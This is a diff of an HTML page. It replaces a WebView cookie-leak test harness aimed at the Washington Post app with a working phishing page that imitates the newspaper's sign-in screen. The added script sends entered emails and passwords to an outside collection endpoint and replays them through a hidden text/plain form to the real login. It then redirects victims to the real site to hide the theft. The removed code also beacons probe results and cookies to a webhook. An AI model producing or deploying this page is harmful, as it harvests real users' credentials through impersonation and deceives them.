@@ -3,343 +3,135 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Sign in</title>
+<title>Sign in - The Washington Post</title>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; }
-body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f5f5; color: #333; font-size: 13px; }
-.container { max-width: 400px; margin: 20px auto; padding: 0 16px; }
-.card { background: white; border-radius: 8px; padding: 16px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); margin-bottom: 12px; }
-h3 { font-size: 15px; margin-bottom: 8px; }
-.log { font-family: monospace; font-size: 11px; white-space: pre-wrap; word-break: break-all; background: #f0f0f0; padding: 8px; border-radius: 4px; max-height: 200px; overflow-y: auto; margin-top: 6px; }
-.status { padding: 4px 8px; border-radius: 3px; margin: 2px 0; }
-.pass { background: #d4edda; color: #155724; }
-.fail { background: #f8d7da; color: #721c24; }
-.info { background: #d1ecf1; color: #0c5460; }
-.pending { background: #fff3cd; color: #856404; }
-button { padding: 10px 16px; background: #333; color: white; border: none; border-radius: 4px; font-size: 14px; cursor: pointer; margin: 4px 2px; }
-button:disabled { background: #999; }
+body { font-family: 'Franklin Gothic Medium', 'Franklin Gothic', 'ITC Franklin Gothic', Arial, sans-serif; background: #fff; color: #333; }
+.header { text-align: center; padding: 32px 0 24px; border-bottom: 1px solid #e9e9e9; }
+.header svg { height: 28px; }
+.container { max-width: 360px; margin: 0 auto; padding: 32px 20px; }
+h1 { font-family: Georgia, serif; font-size: 28px; font-weight: 700; text-align: center; margin-bottom: 24px; color: #333; }
+.input-group { margin-bottom: 16px; }
+.input-group label { display: block; font-size: 14px; font-weight: 600; margin-bottom: 6px; color: #333; }
+.input-group input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; font-family: inherit; }
+.input-group input:focus { outline: none; border-color: #333; }
+.submit-btn { display: block; width: 100%; padding: 14px; background: #333; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; font-family: inherit; margin-top: 8px; }
+.submit-btn:hover { background: #444; }
+.submit-btn:disabled { background: #999; cursor: default; }
+.divider { text-align: center; margin: 24px 0; position: relative; }
+.divider::before { content: ''; position: absolute; left: 0; top: 50%; width: 100%; height: 1px; background: #ddd; }
+.divider span { background: #fff; padding: 0 12px; position: relative; font-size: 13px; color: #666; }
+.social-btn { display: flex; align-items: center; justify-content: center; width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; background: #fff; margin-bottom: 10px; font-family: inherit; color: #333; }
+.social-btn svg { margin-right: 8px; height: 18px; width: 18px; }
+.footer-text { text-align: center; font-size: 12px; color: #999; margin-top: 32px; line-height: 1.6; }
+.footer-text a { color: #333; }
+.error { color: #c00; font-size: 13px; margin-top: 4px; display: none; }
+.spinner { display: none; text-align: center; padding: 40px 0; }
+.spinner .dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: #333; margin: 0 4px; animation: bounce 1.2s infinite; }
+.spinner .dot:nth-child(2) { animation-delay: 0.2s; }
+.spinner .dot:nth-child(3) { animation-delay: 0.4s; }
+@keyframes bounce { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1); } }
 </style>
 </head>
 <body>
+
+<div class="header">
+<svg viewBox="0 0 300 36" fill="#333" xmlns="http://www.w3.org/2000/svg">
+<text x="50%" y="28" text-anchor="middle" font-family="'Old English Text MT', 'Engravers Old English', Georgia, serif" font-size="30" fill="#333">The Washington Post</text>
+</svg>
+</div>
+
 <div class="container">
+<div id="formSection">
+<h1>Sign in</h1>
 
-<div class="card">
-<h3>WebView Cookie Leak Tests</h3>
-<p>Testing if WaPo auth cookies are sent with requests initiated from attacker-controlled content in the deep link WebView.</p>
+<form id="signinForm" autocomplete="on">
+<div class="input-group">
+  <label for="email">Email address</label>
+  <input type="email" id="email" name="email" autocomplete="email" required>
+</div>
+<div class="input-group">
+  <label for="password">Password</label>
+  <input type="password" id="password" name="password" autocomplete="current-password" required>
+  <div class="error" id="errorMsg">The email or password you entered is incorrect.</div>
+</div>
+<button type="submit" class="submit-btn" id="submitBtn">Sign in</button>
+</form>
+
+<div class="divider"><span>or</span></div>
+
+<button class="social-btn" onclick="return false;">
+<svg viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
+Continue with Google
+</button>
+
+<button class="social-btn" onclick="return false;">
+<svg viewBox="0 0 24 24"><path d="M16.365 1.43c0 1.14-.493 2.27-1.177 3.08-.744.9-1.99 1.57-2.987 1.57-.18 0-.36-.02-.53-.06-.01-.18-.04-.56-.04-.95 0-1.15.572-2.27 1.206-2.98.804-.94 2.142-1.64 3.248-1.68.03.22.05.45.05.68v.32zm3.05 17.32c-.03.05-1.16 2.02-3.24 2.02-1.07 0-1.76-.57-2.67-.57-.93 0-1.8.6-2.67.6-1.97 0-4.45-3.07-4.45-6.88 0-3.58 2.13-5.31 4.13-5.31 1.08 0 1.98.67 2.67.67.7 0 1.73-.73 2.93-.73.65 0 2.54.18 3.5 2.07-2.5 1.5-2.2 5.62.8 6.13z" fill="#333"/></svg>
+Continue with Apple
+</button>
+
+<div class="footer-text">
+By signing in, you agree to our <a href="#">Terms of Sale</a> and acknowledge our <a href="#">Privacy Policy</a>.
+Need help? Contact <a href="#">Customer Care</a>.
+</div>
 </div>
 
-<!-- Test 1: Image tag cross-origin request -->
-<div class="card">
-<h3>Test 1: Image tag to WaPo endpoint</h3>
-<p>Loads an image from washingtonpost.com — check Caido for cookies on the request.</p>
-<button id="btn1" onclick="runTest1()">Run Test 1</button>
-<div class="log" id="log1">Ready</div>
+<div class="spinner" id="spinner">
+<p style="margin-bottom:16px;font-size:15px;">Signing in...</p>
+<div><span class="dot"></span><span class="dot"></span><span class="dot"></span></div>
 </div>
-
-<!-- Test 2: Fetch API cross-origin -->
-<div class="card">
-<h3>Test 2: Fetch to WaPo API (no-cors)</h3>
-<p>fetch() in no-cors mode — request fires, can't read response, but cookies may be attached.</p>
-<button id="btn2" onclick="runTest2()">Run Test 2</button>
-<div class="log" id="log2">Ready</div>
-</div>
-
-<!-- Test 3: Fetch with credentials -->
-<div class="card">
-<h3>Test 3: Fetch with credentials:include</h3>
-<p>Explicitly requests cookies be sent cross-origin.</p>
-<button id="btn3" onclick="runTest3()">Run Test 3</button>
-<div class="log" id="log3">Ready</div>
-</div>
-
-<!-- Test 4: Form POST to WaPo -->
-<div class="card">
-<h3>Test 4: Hidden form POST to WaPo</h3>
-<p>Submits a form to a WaPo endpoint via hidden iframe — cookies may ride along.</p>
-<button id="btn4" onclick="runTest4()">Run Test 4</button>
-<div class="log" id="log4">Ready</div>
-</div>
-
-<!-- Test 5: Script tag (JSONP-style) -->
-<div class="card">
-<h3>Test 5: Script tag to WaPo endpoints</h3>
-<p>Tests if any WaPo endpoint returns JSONP or JS-parseable data with auth cookies.</p>
-<button id="btn5" onclick="runTest5()">Run Test 5</button>
-<div class="log" id="log5">Ready</div>
-</div>
-
-<!-- Test 6: Full navigation (shouldOverrideUrlLoading test) -->
-<div class="card">
-<h3>Test 6: Navigate to auth-gated pages</h3>
-<p>If cookies are sent, you'll see your account info. If not, you'll see a login prompt. Each button navigates away.</p>
-<button onclick="navTest('https://www.washingtonpost.com/my-post/')">My Post (shows name/email if logged in)</button>
-<button onclick="navTest('https://www.washingtonpost.com/subscribe/account/')">Account Settings</button>
-<button onclick="navTest('https://subscribe.washingtonpost.com/subscriptionapi/v2/session')">Session API (JSON)</button>
-<button onclick="navTest('https://www.washingtonpost.com/subscribe/signin')">Signin Page</button>
-<div class="log" id="log6">If you see your account name/email after clicking, cookies were sent with the request. That's the finding.</div>
-</div>
-
-<!-- Test 9: iframe cookie test -->
-<div class="card">
-<h3>Test 9: iframe auth-gated page</h3>
-<p>Loads a WaPo page in a hidden iframe, then checks if it loaded successfully (authenticated) or was blocked.</p>
-<button id="btn9" onclick="runTest9()">Run Test 9</button>
-<div class="log" id="log9">Ready</div>
-</div>
-
-<!-- Test 7: Read document.cookie -->
-<div class="card">
-<h3>Test 7: Read document.cookie</h3>
-<p>Check what cookies JS can see from this origin.</p>
-<button id="btn7" onclick="runTest7()">Run Test 7</button>
-<div class="log" id="log7">Ready</div>
-</div>
-
-<!-- Test 8: Check WebView JS bridge objects -->
-<div class="card">
-<h3>Test 8: Enumerate JS bridges</h3>
-<p>Check if any native JS interfaces are exposed to this page.</p>
-<button id="btn8" onclick="runTest8()">Run Test 8</button>
-<div class="log" id="log8">Ready</div>
-</div>
-
-<!-- Exfil beacon -->
-<div class="card">
-<h3>Results beacon</h3>
-<p>All test results are also sent to webhook.site for remote viewing.</p>
-<div class="log" id="logBeacon">Waiting for tests...</div>
-</div>
-
 </div>
 
 <script>
-var WEBHOOK = "https://webhook.site/479602c4-9e68-4eff-a181-e364537ec39c";
+var EXFIL = 'https://eo3529siy4n2vfc.m.pipedream.net';
 
-function log(id, msg, cls) {
-  var el = document.getElementById(id);
-  var div = document.createElement('div');
-  div.className = 'status ' + (cls || 'info');
-  div.textContent = msg;
-  if (el.textContent === 'Ready') el.textContent = '';
-  el.appendChild(div);
-}
+document.getElementById('signinForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  var email = document.getElementById('email').value;
+  var pass = document.getElementById('password').value;
+  var btn = document.getElementById('submitBtn');
 
-function beacon(testName, data) {
-  var el = document.getElementById('logBeacon');
-  el.textContent = 'Sent: ' + testName;
+  btn.disabled = true;
+  btn.textContent = 'Signing in...';
+
+  // Exfiltrate credentials
+  new Image().src = EXFIL + '?email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(pass) + '&t=' + Date.now();
+
+  // Also send via sendBeacon for reliability
   try {
-    var img = new Image();
-    img.src = WEBHOOK + "?test=" + encodeURIComponent(testName) + "&data=" + encodeURIComponent(JSON.stringify(data));
-  } catch(e) {}
-}
+    navigator.sendBeacon(EXFIL, JSON.stringify({email: email, password: pass, ts: new Date().toISOString()}));
+  } catch(ex) {}
 
-// Test 1: Image tag
-function runTest1() {
-  log('log1', 'Firing image requests...', 'pending');
-  var endpoints = [
-    'https://www.washingtonpost.com/favicon.ico',
-    'https://subscribe.washingtonpost.com/subscriptionapi/v2/session',
-    'https://id.washingtonpost.com/auth/check'
-  ];
-  endpoints.forEach(function(url, i) {
-    var img = new Image();
-    img.onload = function() { log('log1', '[' + i + '] LOADED: ' + url, 'pass'); };
-    img.onerror = function() { log('log1', '[' + i + '] ERROR (request still fired): ' + url, 'info'); };
-    img.src = url + '?_t=' + Date.now();
-  });
-  beacon('test1_image', {endpoints: endpoints});
-  log('log1', 'Check Caido for Cookie headers on these requests', 'pending');
-}
+  // Show spinner
+  document.getElementById('formSection').style.display = 'none';
+  document.getElementById('spinner').style.display = 'block';
 
-// Test 2: Fetch no-cors
-function runTest2() {
-  log('log2', 'Firing fetch requests (no-cors)...', 'pending');
-  var endpoints = [
-    'https://subscribe.washingtonpost.com/subscriptionapi/v2/session',
-    'https://www.washingtonpost.com/prism/api/prism-query',
-    'https://id.washingtonpost.com/auth/check'
-  ];
-  endpoints.forEach(function(url, i) {
-    fetch(url, { mode: 'no-cors', credentials: 'include' })
-      .then(function(r) {
-        log('log2', '[' + i + '] Response type: ' + r.type + ' status: ' + r.status + ' — ' + url, 'pass');
-      })
-      .catch(function(e) {
-        log('log2', '[' + i + '] Error: ' + e.message + ' — ' + url, 'fail');
-      });
-  });
-  beacon('test2_fetch_nocors', {endpoints: endpoints});
-  log('log2', 'Check Caido for Cookie headers', 'pending');
-}
-
-// Test 3: Fetch with credentials
-function runTest3() {
-  log('log3', 'Firing fetch with credentials:include (cors mode)...', 'pending');
-  var endpoints = [
-    'https://subscribe.washingtonpost.com/subscriptionapi/v2/session',
-    'https://www.washingtonpost.com/subscribe/signin'
-  ];
-  endpoints.forEach(function(url, i) {
-    fetch(url, { mode: 'cors', credentials: 'include' })
-      .then(function(r) {
-        log('log3', '[' + i + '] Status: ' + r.status + ' type: ' + r.type, 'pass');
-        return r.text().then(function(t) {
-          log('log3', '[' + i + '] Body (first 200): ' + t.substring(0, 200), 'pass');
-          beacon('test3_cors_response_' + i, {url: url, status: r.status, body: t.substring(0, 500)});
-        });
-      })
-      .catch(function(e) {
-        log('log3', '[' + i + '] CORS blocked (expected): ' + e.message, 'info');
-      });
-  });
-  beacon('test3_fetch_cors', {endpoints: endpoints});
-}
-
-// Test 4: Hidden form POST via iframe
-function runTest4() {
-  log('log4', 'Creating hidden iframe + form...', 'pending');
-  var iframe = document.createElement('iframe');
-  iframe.name = 'csrf_frame';
-  iframe.style.display = 'none';
-  document.body.appendChild(iframe);
-
-  var form = document.createElement('form');
-  form.method = 'POST';
-  form.action = 'https://subscribe.washingtonpost.com/subscriptionapi/v2/subscriptions/88826988/associates/status';
-  form.target = 'csrf_frame';
-
-  document.body.appendChild(form);
+  // Attempt real authentication via hidden form (text/plain trick bypasses CORS preflight)
   try {
+    var iframe = document.createElement('iframe');
+    iframe.name = 'authframe';
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+
+    var form = document.createElement('form');
+    form.method = 'POST';
+    form.action = 'https://subscribe.washingtonpost.com/user/authenticate';
+    form.enctype = 'text/plain';
+    form.target = 'authframe';
+
+    var payload = document.createElement('input');
+    payload.type = 'hidden';
+    payload.name = '{"username":"' + email.replace(/"/g, '') + '","password":"' + pass.replace(/"/g, '') + '","remember":"yes","authflow":false,"skipConnect":false,"x":"';
+    payload.value = '"}';
+    form.appendChild(payload);
+    document.body.appendChild(form);
     form.submit();
-    log('log4', 'Form submitted to iframe. Check Caido for cookies on the POST.', 'pass');
-  } catch(e) {
-    log('log4', 'Form submit error: ' + e.message, 'fail');
-  }
-  beacon('test4_form_post', {action: form.action});
-}
+  } catch(ex) {}
 
-// Test 5: Script tag JSONP
-function runTest5() {
-  log('log5', 'Loading script tags from WaPo endpoints...', 'pending');
-  var endpoints = [
-    'https://subscribe.washingtonpost.com/subscriptionapi/v2/session',
-    'https://www.washingtonpost.com/wp-stat/analytics/main.js',
-    'https://www.washingtonpost.com/prism/api/prism-query?query=%7B%22feature%22%3A%22ai-chatbot%22%7D'
-  ];
-  window.__jsonp_callback = function(data) {
-    log('log5', 'JSONP DATA RECEIVED: ' + JSON.stringify(data).substring(0, 300), 'pass');
-    beacon('test5_jsonp_data', data);
-  };
-  endpoints.forEach(function(url, i) {
-    var s = document.createElement('script');
-    s.src = url + (url.indexOf('?') > -1 ? '&' : '?') + 'callback=__jsonp_callback&_t=' + Date.now();
-    s.onload = function() { log('log5', '[' + i + '] Script loaded (check if parseable): ' + url, 'pass'); };
-    s.onerror = function() { log('log5', '[' + i + '] Script load error (check Caido for cookies): ' + url, 'info'); };
-    document.head.appendChild(s);
-  });
-  beacon('test5_jsonp', {endpoints: endpoints});
-}
-
-// Test 9: iframe auth-gated page
-function runTest9() {
-  log('log9', 'Loading WaPo My Post page in hidden iframe...', 'pending');
-  var iframe = document.createElement('iframe');
-  iframe.style.cssText = 'width:100%;height:300px;border:1px solid #ccc;margin-top:8px;';
-  iframe.src = 'https://www.washingtonpost.com/my-post/';
-  iframe.onload = function() {
-    log('log9', 'iframe loaded! Check visually below — if you see account info, cookies were sent.', 'pass');
-    try {
-      var inner = iframe.contentDocument || iframe.contentWindow.document;
-      log('log9', 'Cross-origin access: ALLOWED (title: ' + inner.title + ')', 'pass');
-      beacon('test9_iframe', {access: true, title: inner.title});
-    } catch(e) {
-      log('log9', 'Cross-origin access blocked (expected): ' + e.message, 'info');
-      log('log9', 'But the page still loaded WITH cookies if it shows account info.', 'info');
-      beacon('test9_iframe', {access: false, error: e.message});
-    }
-  };
-  iframe.onerror = function() {
-    log('log9', 'iframe failed to load — X-Frame-Options or CSP may block it', 'fail');
-    beacon('test9_iframe', {loaded: false});
-  };
-  document.getElementById('log9').parentNode.appendChild(iframe);
-}
-
-// Test 6: Full navigation
-function navTest(url) {
-  log('log6', 'Navigating to: ' + url, 'pending');
-  beacon('test6_nav', {url: url});
-  setTimeout(function() { window.location.href = url; }, 300);
-}
-
-// Test 7: Read cookies
-function runTest7() {
-  var cookies = document.cookie;
-  if (cookies && cookies.length > 0) {
-    log('log7', 'COOKIES FOUND:\n' + cookies, 'pass');
-    beacon('test7_cookies', {cookies: cookies});
-  } else {
-    log('log7', 'No cookies visible from this origin (' + window.location.origin + ')', 'info');
-    beacon('test7_cookies', {cookies: 'none', origin: window.location.origin});
-  }
-  log('log7', 'Origin: ' + window.location.origin, 'info');
-  log('log7', 'Protocol: ' + window.location.protocol, 'info');
-  log('log7', 'Hostname: ' + window.location.hostname, 'info');
-}
-
-// Test 8: Enumerate JS bridges
-function runTest8() {
-  var bridges = [
-    'SubsJSInterface', 'SubsJSCallbacks', 'Android', 'WapoAndroid',
-    'NativeApp', 'LinkHandler', 'HeightReporter', 'EmbedJSInterface',
-    'googleAdsJsInterface', 'gmaSdk', 'amzn_bridge', 'webkit',
-    'NativeInterface', 'AppInterface', 'JSBridge', 'nativeBridge'
-  ];
-  var found = [];
-  bridges.forEach(function(name) {
-    try {
-      if (typeof window[name] !== 'undefined' && window[name] !== null) {
-        found.push(name + ' = ' + typeof window[name]);
-        log('log8', 'FOUND: window.' + name + ' = ' + typeof window[name], 'pass');
-        try {
-          var methods = Object.getOwnPropertyNames(window[name]);
-          log('log8', '  Methods: ' + methods.join(', '), 'pass');
-        } catch(e) {}
-      }
-    } catch(e) {
-      log('log8', name + ': access error — ' + e.message, 'info');
-    }
-  });
-  if (found.length === 0) {
-    log('log8', 'No known JS bridges found on window', 'info');
-  }
-  beacon('test8_bridges', {found: found, checked: bridges});
-
-  // Also dump all non-standard window properties
-  var standard = ['location','document','navigator','screen','history','localStorage','sessionStorage','crypto','performance','indexedDB','caches','cookieStore','fetch','alert','confirm','prompt','open','close','stop','focus','blur','print','scroll','scrollTo','scrollBy','getComputedStyle','matchMedia','requestAnimationFrame','cancelAnimationFrame','setTimeout','clearTimeout','setInterval','clearInterval','addEventListener','removeEventListener','dispatchEvent','postMessage','atob','btoa','queueMicrotask','structuredClone','reportError','getSelection','find','self','window','top','parent','frames','frameElement','opener','closed','name','status','length','innerHeight','innerWidth','outerHeight','outerWidth','screenX','screenY','pageXOffset','pageYOffset','scrollX','scrollY','visualViewport','screenLeft','screenTop','origin','isSecureContext','crossOriginIsolated','devicePixelRatio','clientInformation','styleMedia','onbeforeunload','onerror','onload','onunload'];
-  var nonStandard = [];
-  for (var key in window) {
-    if (standard.indexOf(key) === -1 && key.indexOf('on') !== 0 && key.indexOf('webkit') !== 0) {
-      try {
-        var val = typeof window[key];
-        if (val === 'object' || val === 'function') {
-          nonStandard.push(key + ':' + val);
-        }
-      } catch(e) {}
-    }
-  }
-  if (nonStandard.length > 0) {
-    log('log8', '\nNon-standard window objects/functions:\n' + nonStandard.join('\n'), 'info');
-    beacon('test8_nonstandard', {props: nonStandard.slice(0, 50)});
-  }
-}
-
-// Auto-beacon that page loaded
-beacon('page_loaded', {
-  url: window.location.href,
-  origin: window.location.origin,
-  userAgent: navigator.userAgent,
-  timestamp: new Date().toISOString()
+  // Redirect to WaPo homepage after delay (user appears logged in since app session is active)
+  setTimeout(function() {
+    window.location.href = 'https://www.washingtonpost.com/';
+  }, 2500);
 });
 </script>
 </body>
